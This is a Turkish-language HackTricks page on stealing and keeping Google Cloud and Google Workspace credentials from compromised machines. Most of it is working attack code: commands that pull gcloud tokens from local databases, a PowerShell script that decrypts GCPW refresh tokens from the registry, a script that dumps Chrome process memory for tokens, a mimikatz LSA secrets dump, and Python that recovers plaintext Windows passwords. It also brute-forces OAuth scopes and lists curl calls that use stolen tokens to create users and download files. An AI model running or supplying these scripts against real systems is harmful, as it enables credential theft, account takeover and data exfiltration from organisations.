# GCP - Non-svc Persistance

{% hint style="success" %}


paLearn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

Bunlar, bir şekilde bazı GCP kimlik bilgilerini veya GCP ortamında çalışan bir makineyi ele geçirdiğinizde faydalı tekniklerdir.

## Token Hijacking

### Kimlik Doğrulanmış Kullanıcı Token'ları

Bir kullanıcının **mevcut token'ını** almak için şunu çalıştırabilirsiniz:

{% code overflow="wrap" %}
```bash
sqlite3 $HOME/.config/gcloud/access_tokens.db "select access_token from access_tokens where account_id='<email>';"
```
{% endcode %}

Bu sayfada **bu tokeni gcloud kullanarak doğrudan nasıl kullanacağınızı** kontrol edin:

{% embed url="https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf#id-6440-1" %}

**Yeni bir erişim tokeni oluşturmak için** detayları almak üzere çalıştırın:

{% code overflow="wrap" %}
```bash
sqlite3 $HOME/.config/gcloud/credentials.db "select value from credentials where account_id='<email>';"
```
{% endcode %}

Ayrıca **`$HOME/.config/gcloud/application_default_credentials.json`** ve **`$HOME/.config/gcloud/legacy_credentials/*/adc.json`** dosyalarında refresh token'ları bulmak da mümkündür.

Yeni bir erişim token'ı almak için **refresh token**, istemci kimliği ve istemci sırrı ile şunu çalıştırın:

{% code overflow="wrap" %}
```bash
curl -s --data client_id=<client_id> --data client_secret=<client_secret> --data grant_type=refresh_token --data refresh_token=<refresh_token> --data scope="https://www.googleapis.com/auth/cloud-platform https://www.googleapis.com/auth/accounts.reauth" https://www.googleapis.com/oauth2/v4/token
```
{% endcode %}

Refresh token geçerliliği **Admin** > **Güvenlik** > **Google Cloud oturum kontrolü** altında yönetilebilir ve varsayılan olarak 16 saat olarak ayarlanmıştır, ancak süresiz olarak ayarlanabilir:

<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

### Kimlik doğrulama akışı

`gcloud auth login` gibi bir şey kullanıldığında kimlik doğrulama akışı, tarayıcıda bir istem açar ve tüm kapsamları kabul ettikten sonra tarayıcı, aracın açtığı http portuna bu gibi bir istek gönderir:
```
/?state=EN5AK1GxwrEKgKog9ANBm0qDwWByYO&code=4/0AeaYSHCllDzZCAt2IlNWjMHqr4XKOuNuhOL-TM541gv-F6WOUsbwXiUgMYvo4Fg0NGzV9A&scope=email%20openid%20https://www.googleapis.com/auth/userinfo.email%20https://www.googleapis.com/auth/cloud-platform%20https://www.googleapis.com/auth/appengine.admin%20https://www.googleapis.com/auth/sqlservice.login%20https://www.googleapis.com/auth/compute%20https://www.googleapis.com/auth/accounts.reauth&authuser=0&prompt=consent HTTP/1.1
```
Sonra, gcloud, bazı sabit kodlanmış `client_id` (`32555940559.apps.googleusercontent.com`) ve **`client_secret`** (`ZmssLNjJy2998hD4CTg2ejr2`) ile **son refresh token verilerini** almak için durumu ve kodu kullanacaktır.

{% hint style="danger" %}
localhost ile iletişimin HTTP üzerinden olduğunu unutmayın, bu nedenle bir refresh token almak için verileri yakalamak mümkündür, ancak bu veri yalnızca 1 kez geçerlidir, bu yüzden bu işe yaramaz, refresh token'ı dosyadan okumak daha kolaydır.
{% endhint %}

### OAuth Kapsamları

Tüm Google kapsamlarını [https://developers.google.com/identity/protocols/oauth2/scopes](https://developers.google.com/identity/protocols/oauth2/scopes) adresinde bulabilirsiniz veya bunları çalıştırarak alabilirsiniz:

{% code overflow="wrap" %}
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-A/\-\._]*' | sort -u
```
{% endcode %}

Bu betikle **`gcloud`**'un kimlik doğrulamak için kullandığı uygulamanın hangi kapsamları destekleyebileceğini görebilirsiniz:
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-Z/\._\-]*' | sort -u | while read -r scope; do
echo -ne "Testing $scope         \r"
if ! curl -v "https://accounts.google.com/o/oauth2/auth?response_type=code&client_id=32555940559.apps.googleusercontent.com&redirect_uri=http%3A%2F%2Flocalhost%3A8085%2F&scope=openid+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.email+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fcloud-platform+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fappengine.admin+$scope+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fsqlservice.login+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fcompute+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Faccounts.reauth&state=AjvFqBW5XNIw3VADagy5pvUSPraLQu&access_type=offline&code_challenge=IOk5F08WLn5xYPGRAHP9CTGHbLFDUElsP551ni2leN4&code_challenge_method=S256" 2>&1 | grep -q "error"; then
echo ""
echo $scope
fi
done
```
Bu uygulamanın bu kapsamları desteklediği kontrol edildi:
```
https://www.googleapis.com/auth/appengine.admin
https://www.googleapis.com/auth/bigquery
https://www.googleapis.com/auth/cloud-platform
https://www.googleapis.com/auth/compute
https://www.googleapis.com/auth/devstorage.full_control
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/userinfo.email
```
ilginçtir ki, bu uygulamanın **`drive`** kapsamını desteklemesi, bir saldırganın kullanıcıyı bu kapsamla bir token oluşturması için zorlaması durumunda, kullanıcının GCP'den Workspace'e geçiş yapmasına olanak tanıyabilir.

**Bunu nasıl kötüye kullanacağınızı kontrol edin** [**buradan**](../gcp-to-workspace-pivoting/#abusing-gcloud)**.**

### Hizmet Hesapları

Kimlik doğrulaması yapılmış kullanıcılarla olduğu gibi, eğer bir hizmet hesabının **özel anahtar dosyasını ele geçirirseniz**, genellikle **istediğiniz kadar erişim sağlayabilirsiniz**.\
Ancak, bir hizmet hesabının **OAuth token'ını çalarsanız** bu daha da ilginç olabilir, çünkü, varsayılan olarak bu token'lar sadece bir saat boyunca geçerli olsa da, eğer **kurban özel api anahtarını silerse, OAuth token'ı süresi dolana kadar geçerli kalacaktır**.

### Metadata

Açıkça, GCP ortamında çalışan bir makinenin içindeyseniz, **o makineye bağlı hizmet hesabına erişim sağlayabileceksiniz, bu da metadata uç noktasına ulaşarak mümkündür** (bu uç noktada erişebileceğiniz OAuth token'larının genellikle kapsamlarla kısıtlandığını unutmayın).

### Çözüm Önerileri

Bu teknikler için bazı çözüm önerileri [https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2](https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2) adresinde açıklanmıştır.

## GCPW - Google Credential Provider for Windows

Bu, Google Workspaces'ın sağladığı tek oturum açma sistemidir, böylece kullanıcılar **Workspace kimlik bilgilerini** kullanarak Windows PC'lerine giriş yapabilirler. Ayrıca, bu, Google Workspace'e erişim sağlamak için token'ları PC'de bir yerde saklayacaktır.

GCPW'nin bir cihazda kurulu olup olmadığını kontrol etmek için, aşağıdaki işlemin var olup olmadığını veya aşağıdaki kayıt defteri anahtarlarının var olup olmadığını kontrol edebilirsiniz:
```powershell
# Check process gcpw_extension.exe
if (Get-Process -Name "gcpw_extension" -ErrorAction SilentlyContinue) {
Write-Output "The process gcpw_xtension.exe is running."
} else {
Write-Output "The process gcpw_xtension.exe is not running."
}

# Check if HKLM\SOFTWARE\Google\GCPW\Users exists
$gcpwHKLMPath = "HKLM:\SOFTWARE\Google\GCPW\Users"
if (Test-Path $gcpwHKLMPath) {
Write-Output "GCPW is installed: The key $gcpwHKLMPath exists."
} else {
Write-Output "GCPW is not installed: The key $gcpwHKLMPath does not exist."
}

# Check if HKCU\SOFTWARE\Google\Accounts exists
$gcpwHKCUPath = "HKCU:\SOFTWARE\Google\Accounts"
if (Test-Path $gcpwHKCUPath) {
Write-Output "Google Accounts are present: The key $gcpwHKCUPath exists."
} else {
Write-Output "No Google Accounts found: The key $gcpwHKCUPath does not exist."
}
```
Aslında **`HKLM:\SOFTWARE\Google\GCPW\Users`** içinde **giriş yapmaya izin verilen alan adlarını** `domains_allowed` anahtarında bulmak mümkündür ve alt anahtarlarda kullanıcı hakkında e-posta, resim, kullanıcı adı, token ömrü gibi bilgiler bulunabilir...

Ve **`HKCU:\SOFTWARE\Google\Accounts`** içinde kullanıcının e-posta adresine ve kullanıcı yakın zamanda giriş yaptıysa şifrelenmiş **refresh token**'a erişmek mümkündür.

### GCPW - Kayıt Defteri Refresh Token'ları

Kayıt defteri **`HKCU:\SOFTWARE\Google\Accounts`** içinde şifrelenmiş **`refresh_token`** içeren bazı hesaplar bulmak mümkün olabilir. **`ProtectedData.Unprotect`** yöntemi bunu kolayca çözebilir.

<details>

<summary>Get <strong><code>HKCU:\SOFTWARE\Google\Accounts</code></strong> data and decrypt refresh_tokens</summary>
```powershell
# Import required namespace for decryption
Add-Type -AssemblyName System.Security

# Base registry path
$baseKey = "HKCU:\SOFTWARE\Google\Accounts"

# Function to search and decrypt refresh_token values
function Get-RegistryKeysAndDecryptTokens {
param (
[string]$keyPath
)

# Get all values within the current key
$registryKey = Get-Item -Path $keyPath
$foundToken = $false

# Loop through properties to find refresh_token
foreach ($property in $registryKey.Property) {
if ($property -eq "refresh_token") {
$foundToken = $true
try {
# Get the raw bytes of the refresh_token from the registry
$encryptedTokenBytes = (Get-ItemProperty -Path $keyPath -Name $property).$property

# Decrypt the bytes using ProtectedData.Unprotect
$decryptedTokenBytes = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedTokenBytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
$decryptedToken = [System.Text.Encoding]::UTF8.GetString($decryptedTokenBytes)

Write-Output "Path: $keyPath"
Write-Output "Decrypted refresh_token: $decryptedToken"
Write-Output "-----------------------------"
}
catch {
Write-Output "Path: $keyPath"
Write-Output "Failed to decrypt refresh_token: $($_.Exception.Message)"
Write-Output "-----------------------------"
}
}
}

# Recursively process all subkeys
Get-ChildItem -Path $keyPath | ForEach-Object {
Get-RegistryKeysAndDecryptTokens -keyPath $_.PSPath
}
}

# Start the search from the base key
Get-RegistryKeysAndDecryptTokens -keyPath $baseKey
```
</details>

Örnek çıktı:

{% code overflow="wrap" %}
```
Path: Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\SOFTWARE\Google\Accounts\100402336966965820570Decrypted refresh_token: 1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI
```
{% endcode %}

[**Bu videoda**](https://www.youtube.com/watch?v=FEQxHRRP\_5I) açıklandığı gibi, eğer kayıtta token bulamazsanız, **`HKLM:\SOFTWARE\Google\GCPW\Users\<sid>\th`** değerini değiştirmek (veya silmek) mümkündür ve kullanıcı bilgisayara eriştiğinde tekrar giriş yapması gerekecek ve **token önceki kayıtta saklanacaktır**.

### GCPW - Disk Yenileme Token'ları

Dosya **`%LocalAppData%\Google\Chrome\User Data\Local State`** kullanıcının **Google Chrome profilleri** içindeki **`refresh_tokens`**'ı şifre çözmek için anahtarı saklar:

* `%LocalAppData%\Google\Chrome\User Data\Default\Web Data`
* `%LocalAppData%\Google\Chrome\Profile*\Default\Web Data`

Bu token'lara şifrelenmemiş şekilde erişen bazı **C# kodu** [**Winpeas**](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe) içinde bulunabilir.

Ayrıca, şifreleme bu kodda bulunabilir: [https://github.com/chromium/chromium/blob/7b5e817cb016f946a29378d2d39576a4ca546605/components/os\_crypt/sync/os\_crypt\_win.cc#L216](https://github.com/chromium/chromium/blob/7b5e817cb016f946a29378d2d39576a4ca546605/components/os\_crypt/sync/os\_crypt\_win.cc#L216)

AESGCM'nin kullanıldığı gözlemlenebilir, şifrelenmiş token bir **sürüm** ile başlar (**`v10`** şu anda), ardından [**12B nonce**](https://github.com/chromium/chromium/blob/7b5e817cb016f946a29378d2d39576a4ca546605/components/os\_crypt/sync/os\_crypt\_win.cc#L42) gelir ve ardından **şifreli metin** ile son bir **16B mac** bulunur.

### GCPW - Süreç Belleğinden Token'ları Dökme

Aşağıdaki script, `procdump` kullanarak her **Chrome** sürecini **dökme**, **string'leri** çıkartma ve ardından **erişim ve yenileme token'ları** ile ilgili string'leri **arama** için kullanılabilir.

**Deneyimlerime göre, Chrome süreçlerini dökme veya hatta `gcpw_extension.exe` sürecini bulamadı.**

<details>

<summary>Chrome süreçlerini dök ve token'ları ara</summary>
```powershell
# Define paths for Procdump and Strings utilities
$procdumpPath = "C:\path\to\SysinternalsSuite\procdump.exe"
$stringsPath = "C:\path\to\SysinternalsSuite\strings.exe"
$dumpFolder = "C:\ChromeDumps"
$targetString = "ya29" # "1//" for refresh_tokens

# Create a directory for the dumps if it doesn't exist
if (!(Test-Path $dumpFolder)) {
New-Item -Path $dumpFolder -ItemType Directory
}

# Get all Chrome process IDs
$chromeProcesses = Get-Process -Name "chrome" | Select-Object -ExpandProperty Id

# Dump each Chrome process
foreach ($processId in $chromeProcesses) {
Write-Output "Dumping process with PID: $processId"
& $procdumpPath -ma $processId "$dumpFolder\chrome_$processId.dmp"
}

# Extract strings and search for the target string in each dump
Get-ChildItem $dumpFolder -Filter "*.dmp" | ForEach-Object {
$dumpFile = $_.FullName
$asciiStringsOutputFile = "$dumpFolder\chrome_$($_.BaseName)_ascii_strings.txt"
$unicodeStringsOutputFile = "$dumpFolder\chrome_$($_.BaseName)_unicode_strings.txt"

Write-Output "Extracting ASCII strings from $dumpFile"
& $stringsPath $dumpFile > $asciiStringsOutputFile

Write-Output "Extracting UTF-16 strings from $dumpFile"
& $stringsPath -u $dumpFile > $unicodeStringsOutputFile

Write-Output "Searching for '$targetString' in $asciiStringsOutputFile"
Select-String -Path $asciiStringsOutputFile -Pattern $targetString | ForEach-Object {
Write-Output $_.Line
}

Write-Output "Searching for '$targetString' in $unicodeStringsOutputFile"
Select-String -Path $unicodeStringsOutputFile -Pattern $targetString | ForEach-Object {
Write-Output $_.Line
}
}
```
</details>

### GCPW - Düz metin şifresini geri kazanma

GCPW'yi kötüye kullanarak şifrenin düz metnini geri kazanmak için **mimikatz** kullanarak **LSASS**'dan şifrelenmiş şifreyi dökmek mümkündür:
```
mimikatz_trunk\x64\mimikatz.exe token::elevate lsadump::secrets exit
```
Sonra, resmi gibi `Chrome-GCPW-<sid>` şeklinde gizli anahtarı arayın:

<figure><img src="../../../.gitbook/assets/telegram-cloud-photo-size-4-6044191430395675441-x.jpg" alt=""><figcaption></figcaption></figure>

Daha sonra, `https://www.google.com/accounts/OAuthLogin` kapsamına sahip bir **erişim belirteci** ile şifreyi çözmek için özel anahtarı talep etmek mümkündür:

<details>

<summary>Erişim belirteci, şifrelenmiş şifre ve kaynak kimliği verildiğinde şifreyi düz metin olarak elde etmek için script</summary>
```python
import requests
from base64 import b64decode
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA

def get_decryption_key(access_token, resource_id):
try:
# Request to get the private key
response = requests.get(
f"https://devicepasswordescrowforwindows-pa.googleapis.com/v1/getprivatekey/{resource_id}",
headers={
"Authorization": f"Bearer {access_token}"
}
)

# Check if the response is successful
if response.status_code == 200:
private_key = response.json()["base64PrivateKey"]
# Properly format the RSA private key
private_key = f"-----BEGIN RSA PRIVATE KEY-----\n{private_key.strip()}\n-----END RSA PRIVATE KEY-----"
return private_key
else:
raise ValueError(f"Failed to retrieve private key: {response.text}")

except requests.RequestException as e:
print(f"Error occurred while requesting the private key: {e}")
return None

def decrypt_password(access_token, lsa_secret):
try:
# Obtain the private key using the resource_id
resource_id = lsa_secret["resource_id"]
encrypted_data = b64decode(lsa_secret["encrypted_password"])

private_key_pem = get_decryption_key(access_token, resource_id)
print("Found private key:")
print(private_key_pem)

if private_key_pem is None:
raise ValueError("Unable to retrieve the private key.")

# Load the RSA private key
rsa_key = RSA.import_key(private_key_pem)
key_size = int(rsa_key.size_in_bits() / 8)

# Decrypt the encrypted data
cipher_rsa = PKCS1_OAEP.new(rsa_key)
session_key = cipher_rsa.decrypt(encrypted_data[:key_size])

# Extract the session key and other data from decrypted payload
session_header = session_key[:32]
session_nonce = session_key[32:]
mac = encrypted_data[-16:]

# Decrypt the AES GCM data
aes_cipher = AES.new(session_header, AES.MODE_GCM, nonce=session_nonce)
decrypted_password = aes_cipher.decrypt_and_verify(encrypted_data[key_size:-16], mac)

print("Decrypted Password:", decrypted_password.decode("utf-8"))

except Exception as e:
print(f"Error occurred during decryption: {e}")

# CHANGE THIS INPUT DATA!
access_token = "<acces_token>"
lsa_secret = {
"encrypted_password": "<encrypted-password>",
"resource_id": "<resource-id>"
}

decrypt_password(access_token, lsa_secret)
```
</details>

### GCPW - Yenileme jetonlarından erişim jetonları oluşturma

Yenileme jetonunu kullanarak, aşağıdaki komutta belirtilen istemci kimliği ve istemci sırrını kullanarak erişim jetonları oluşturmak mümkündür:
```bash
curl -s --data "client_id=77185425430.apps.googleusercontent.com" \
--data "client_secret=OTJgUOQcT7lO7GsGZq2G4IlT" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI" \
\
https://www.googleapis.com/oauth2/v4/token
```
### GCPW - Kapsamlar

Varsayılan olarak GCPW, kullanıcı olarak her olası OAuth kapsamına erişime sahip olmayacaktır, bu nedenle aşağıdaki betiği kullanarak `refresh_token` ile bir `access_token` oluşturmak için kullanılabilecek kapsamları bulabiliriz:

<details>

<summary>Kapsamları zorlamak için Bash betiği</summary>
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-Z/\._\-]*' | sort -u | while read -r scope; do
echo -ne "Testing $scope           \r"
if ! curl -s --data "client_id=77185425430.apps.googleusercontent.com" \
--data "client_secret=OTJgUOQcT7lO7GsGZq2G4IlT" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI" \
--data "scope=$scope" \
https://www.googleapis.com/oauth2/v4/token 2>&1 | grep -q "error_description"; then
echo ""
echo $scope
echo $scope >> /tmp/valid_scopes.txt
fi
done

echo ""
echo ""
echo "Valid scopes:"
cat /tmp/valid_scopes.txt
rm /tmp/valid_scopes.txt
```
</details>

Ve yazma anında aldığım çıktı:
```
Valid scopes:
https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/calendar
https://www.googleapis.com/auth/calendar.events
https://www.googleapis.com/auth/calendar.events.readonly
https://www.googleapis.com/auth/calendar.readonly
https://www.googleapis.com/auth/classroom.courses.readonly
https://www.googleapis.com/auth/classroom.coursework.me.readonly
https://www.googleapis.com/auth/classroom.coursework.students.readonly
https://www.googleapis.com/auth/classroom.profile.emails
https://www.googleapis.com/auth/classroom.profile.photos
https://www.googleapis.com/auth/classroom.rosters.readonly
https://www.googleapis.com/auth/classroom.student-submissions.me.readonly
https://www.googleapis.com/auth/classroom.student-submissions.students.readonly
https://www.googleapis.com/auth/cloud-translation
https://www.googleapis.com/auth/cloud_search.query
https://www.googleapis.com/auth/devstorage.read_write
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/drive.apps.readonly
https://www.googleapis.com/auth/drive.file
https://www.googleapis.com/auth/drive.readonly
https://www.googleapis.com/auth/ediscovery
https://www.googleapis.com/auth/firebase.messaging
https://www.googleapis.com/auth/spreadsheets
https://www.googleapis.com/auth/tasks
https://www.googleapis.com/auth/tasks.readonly
https://www.googleapis.com/auth/userinfo.email
https://www.googleapis.com/auth/userinfo.profile
https://www.google.com/accounts/OAuthLogin
```
**Tüm bu kapsamlarla bir erişim belirteci alın**:

<details>

<summary>Tüm kapsamlarla refresh_token'dan erişim belirteci oluşturmak için Bash betiği</summary>
```bash
export scope=$(echo "https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/calendar
https://www.googleapis.com/auth/calendar.events
https://www.googleapis.com/auth/calendar.events.readonly
https://www.googleapis.com/auth/calendar.readonly
https://www.googleapis.com/auth/classroom.courses.readonly
https://www.googleapis.com/auth/classroom.coursework.me.readonly
https://www.googleapis.com/auth/classroom.coursework.students.readonly
https://www.googleapis.com/auth/classroom.profile.emails
https://www.googleapis.com/auth/classroom.profile.photos
https://www.googleapis.com/auth/classroom.rosters.readonly
https://www.googleapis.com/auth/classroom.student-submissions.me.readonly
https://www.googleapis.com/auth/classroom.student-submissions.students.readonly
https://www.googleapis.com/auth/cloud-translation
https://www.googleapis.com/auth/cloud_search.query
https://www.googleapis.com/auth/devstorage.read_write
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/drive.apps.readonly
https://www.googleapis.com/auth/drive.file
https://www.googleapis.com/auth/drive.readonly
https://www.googleapis.com/auth/ediscovery
https://www.googleapis.com/auth/firebase.messaging
https://www.googleapis.com/auth/spreadsheets
https://www.googleapis.com/auth/tasks
https://www.googleapis.com/auth/tasks.readonly
https://www.googleapis.com/auth/userinfo.email
https://www.googleapis.com/auth/userinfo.profile
https://www.google.com/accounts/OAuthLogin" | tr '\n' ' ')

curl -s --data "client_id=77185425430.apps.googleusercontent.com" \
--data "client_secret=OTJgUOQcT7lO7GsGZq2G4IlT" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI" \
--data "scope=$scope" \
https://www.googleapis.com/oauth2/v4/token
```
</details>

Bu kapsamların bazılarını kullanarak bazı örnekler:

<details>

<summary>https://www.googleapis.com/auth/userinfo.email &#x26; https://www.googleapis.com/auth/userinfo.profile</summary>
```bash
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/oauth2/v2/userinfo"

{
"id": "100203736939176354570",
"email": "hacktricks@example.com",
"verified_email": true,
"name": "John Smith",
"given_name": "John",
"family_name": "Smith",
"picture": "https://lh3.googleusercontent.com/a/ACg8ocKLvue[REDACTED]wcnzhyKH_p96Gww=s96-c",
"locale": "en",
"hd": "example.com"
}
```
</details>

<details>

<summary>https://www.googleapis.com/auth/admin.directory.user</summary>
```bash
# List users
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/admin/directory/v1/users?customer=<workspace_id>&maxResults=100&orderBy=email"

# Create user
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"primaryEmail": "newuser@hdomain.com",
"name": {
"givenName": "New",
"familyName": "User"
},
"password": "UserPassword123",
"changePasswordAtNextLogin": true
}' \
"https://www.googleapis.com/admin/directory/v1/users"
```
</details>

<details>

<summary>https://www.googleapis.com/auth/drive</summary>
```bash
# List files
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/drive/v3/files?pageSize=10&fields=files(id,name,modifiedTime)&orderBy=name"
{
"files": [
{
"id": "1Z8m5ALSiHtewoQg1LB8uS9gAIeNOPBrq",
"name": "Veeam new vendor form 1 2024.docx",
"modifiedTime": "2024-08-30T09:25:35.219Z"
}
]
}

# Download file
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/drive/v3/files/<file-id>?alt=media" \
-o "DownloadedFileName.ext"

# Upload file
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/octet-stream" \
--data-binary @path/to/file.ext \
"https://www.googleapis.com/upload/drive/v3/files?uploadType=media"
```
</details>

<details>

<summary>https://www.googleapis.com/auth/devstorage.read_write</summary>
```bash
# List buckets from a project
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/storage/v1/b?project=<project-id>"

# List objects in a bucket
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/storage/v1/b/<bucket-name>/o?maxResults=10&fields=items(id,name,size,updated)&orderBy=name"

# Upload file to bucket
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/octet-stream" \
--data-binary @path/to/yourfile.ext \
"https://www.googleapis.com/upload/storage/v1/b/<BUCKET_NAME>/o?uploadType=media&name=<OBJECT_NAME>"

# Download file from bucket
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/storage/v1/b/BUCKET_NAME/o/OBJECT_NAME?alt=media" \
-o "DownloadedFileName.ext"
```
</details>

<details>

<summary>https://www.googleapis.com/auth/spreadsheets</summary>
```bash
# List spreadsheets
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/drive/v3/files?q=mimeType='application/vnd.google-apps.spreadsheet'&fields=files(id,name,modifiedTime)&pageSize=100"

# Download as pdf
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/drive/v3/files/106VJxeyIsVTkixutwJM1IiJZ0ZQRMiA5mhfe8C5CxMc/export?mimeType=application/pdf" \
-o "Spreadsheet.pdf"

# Create spreadsheet
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"properties": {
"title": "New Spreadsheet"
}
}' \
"https://sheets.googleapis.com/v4/spreadsheets"

# Read data from a spreadsheet
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://sheets.googleapis.com/v4/spreadsheets/<SPREADSHEET_ID>/values/Sheet1!A1:C10"

# Update data in spreadsheet
curl -X PUT \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"range": "Sheet1!A2:C2",
"majorDimension": "ROWS",
"values": [
["Alice Johnson", "28", "alice.johnson@example.com"]
]
}' \
"https://sheets.googleapis.com/v4/spreadsheets/<SPREADSHEET_ID>/values/Sheet1!A2:C2?valueInputOption=USER_ENTERED"

# Append data
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"values": [
["Bob Williams", "35", "bob.williams@example.com"]
]
}' \
"https://sheets.googleapis.com/v4/spreadsheets/SPREADSHEET_ID/values/Sheet1!A:C:append?valueInputOption=USER_ENTERED"
```
</details>

<details>

<summary>https://www.googleapis.com/auth/ediscovery (Google Vault)</summary>

**Google Workspace Vault**, Google Workspace için veri saklama, arama ve dışa aktarma araçları sağlayan bir eklentidir. Bu araçlar, Gmail, Drive, Chat ve daha fazlası gibi Google Workspace hizmetlerinde saklanan kuruluş verilerinizi yönetmenize yardımcı olur.

* Google Workspace Vault'taki bir **Matter**, belirli bir dava, soruşturma veya hukuki mesele ile ilgili tüm bilgileri organize eden ve gruplandıran bir **kapsayıcıdır**. Bu, o belirli konu ile ilgili **Holds**, **Searches** ve **Exports** yönetimi için merkezi bir merkez olarak hizmet eder.
* Google Workspace Vault'taki bir **Hold**, belirli kullanıcılar veya gruplar üzerinde **veri silinmesini veya değiştirilmesini önlemek** için uygulanan bir **koruma eylemidir**. Holds, ilgili bilgilerin bir hukuki dava veya soruşturma süresince sağlam ve değiştirilmemiş kalmasını sağlar.
```bash
# List matters
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://vault.googleapis.com/v1/matters?pageSize=10"

# Create matter
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"name": "Legal Case 2024",
"description": "Matter for the upcoming legal case involving XYZ Corp.",
"state": "OPEN"
}' \
"https://vault.googleapis.com/v1/matters"

# Get specific matter
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://vault.googleapis.com/v1/matters/<MATTER_ID>"

# List holds in a matter
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://vault.googleapis.com/v1/matters/<MATTER_ID>/holds?pageSize=10"
```
Daha fazla [API uç noktası belgelerde](https://developers.google.com/vault/reference/rest).

</details>

## Referanslar

* [https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-1](https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-1)
* [https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2](https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2)
* [https://www.youtube.com/watch?v=FEQxHRRP\_5I](https://www.youtube.com/watch?v=FEQxHRRP\_5I)
* [https://issues.chromium.org/issues/40063291](https://issues.chromium.org/issues/40063291)

{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Ekip Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
